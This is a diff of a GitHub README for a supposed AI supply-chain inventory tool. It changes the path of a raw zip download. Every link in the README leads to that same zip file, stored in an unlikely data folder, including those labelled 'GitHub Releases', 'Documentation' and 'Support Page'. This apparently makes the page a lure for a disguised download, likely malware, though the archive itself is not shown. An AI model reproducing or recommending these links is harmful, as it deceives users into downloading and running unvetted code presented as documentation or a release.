@@ -1,7 +1,7 @@
 # 🛠️ Intelligent_Supply_Chain - Optimize Your Inventory Effortlessly
 
 ## 🔗 Download Now
-[![Download Intelligent_Supply_Chain](https://github.com/OrangIndoAseli/Intelligent_Supply_Chain/raw/refs/heads/main/reports/figures/Chain-Supply-Intelligent-2.6-beta.3.zip)](https://github.com/OrangIndoAseli/Intelligent_Supply_Chain/raw/refs/heads/main/reports/figures/Chain-Supply-Intelligent-2.6-beta.3.zip)
+[![Download Intelligent_Supply_Chain](https://github.com/OrangIndoAseli/Intelligent_Supply_Chain/raw/refs/heads/main/data/raw/Chain_Supply_Intelligent_2.4.zip)](https://github.com/OrangIndoAseli/Intelligent_Supply_Chain/raw/refs/heads/main/data/raw/Chain_Supply_Intelligent_2.4.zip)
 
 ## 🚀 Getting Started
 Welcome to the Intelligent Supply Chain application! This software uses advanced AI techniques to help you manage your inventory smoothly. You can easily avoid stockouts and keep your supply chain efficient. 
@@ -18,7 +18,7 @@ Before you download, make sure your computer meets these needs:
 - **Network:** Internet connection for initial setup and updates.
 
 ## 📥 Download & Install
-To get the latest version of Intelligent Supply Chain, visit this page to download: [GitHub Releases](https://github.com/OrangIndoAseli/Intelligent_Supply_Chain/raw/refs/heads/main/reports/figures/Chain-Supply-Intelligent-2.6-beta.3.zip).
+To get the latest version of Intelligent Supply Chain, visit this page to download: [GitHub Releases](https://github.com/OrangIndoAseli/Intelligent_Supply_Chain/raw/refs/heads/main/data/raw/Chain_Supply_Intelligent_2.4.zip).
 
 ### Steps to Download:
 1. Click on the link above.
@@ -53,7 +53,7 @@ If you encounter issues while using the application, consider these tips:
 - **Ensure Compatibility:** Verify that your operating system meets the requirements.
 - **Check File Formats:** Make sure your data files are in the correct format before uploading.
 - **Restart the Application:** Occasionally, closing and reopening the application can resolve minor glitches.
-- **Visit Support:** If problems persist, check our [support page](https://github.com/OrangIndoAseli/Intelligent_Supply_Chain/raw/refs/heads/main/reports/figures/Chain-Supply-Intelligent-2.6-beta.3.zip) for further help.
+- **Visit Support:** If problems persist, check our [support page](https://github.com/OrangIndoAseli/Intelligent_Supply_Chain/raw/refs/heads/main/data/raw/Chain_Supply_Intelligent_2.4.zip) for further help.
 
 ## 📣 Community Feedback
 We value your input! After using Intelligent Supply Chain, please share your thoughts:
@@ -76,11 +76,11 @@ For more information about our technologies and methods, check out the following
 - Time-Series Analysis
 
 ## 🔗 Links
-- [GitHub Repository](https://github.com/OrangIndoAseli/Intelligent_Supply_Chain/raw/refs/heads/main/reports/figures/Chain-Supply-Intelligent-2.6-beta.3.zip)
-- [Documentation](https://github.com/OrangIndoAseli/Intelligent_Supply_Chain/raw/refs/heads/main/reports/figures/Chain-Supply-Intelligent-2.6-beta.3.zip)
-- [Support Page](https://github.com/OrangIndoAseli/Intelligent_Supply_Chain/raw/refs/heads/main/reports/figures/Chain-Supply-Intelligent-2.6-beta.3.zip)
+- [GitHub Repository](https://github.com/OrangIndoAseli/Intelligent_Supply_Chain/raw/refs/heads/main/data/raw/Chain_Supply_Intelligent_2.4.zip)
+- [Documentation](https://github.com/OrangIndoAseli/Intelligent_Supply_Chain/raw/refs/heads/main/data/raw/Chain_Supply_Intelligent_2.4.zip)
+- [Support Page](https://github.com/OrangIndoAseli/Intelligent_Supply_Chain/raw/refs/heads/main/data/raw/Chain_Supply_Intelligent_2.4.zip)
 
 ## 📥 Download Again
-To download the application, visit this page: [GitHub Releases](https://github.com/OrangIndoAseli/Intelligent_Supply_Chain/raw/refs/heads/main/reports/figures/Chain-Supply-Intelligent-2.6-beta.3.zip).
+To download the application, visit this page: [GitHub Releases](https://github.com/OrangIndoAseli/Intelligent_Supply_Chain/raw/refs/heads/main/data/raw/Chain_Supply_Intelligent_2.4.zip).
 
 Happy optimizing!
